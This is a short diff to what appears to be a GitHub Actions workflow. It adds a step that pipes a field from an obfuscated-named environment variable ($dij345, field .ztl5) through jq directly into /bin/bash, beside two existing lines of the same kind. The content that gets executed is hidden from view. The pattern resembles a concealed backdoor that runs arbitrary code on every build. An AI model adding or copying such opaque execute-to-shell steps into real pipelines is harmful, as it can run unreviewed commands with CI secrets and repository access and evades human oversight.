@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$z20341" | jq -r .nidcg2122 | /bin/bash
           printf '%s' "$cngxg423" | jq -r .nykml5786 | /bin/bash
+          printf '%s' "$dij345" | jq -r .ztl5 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
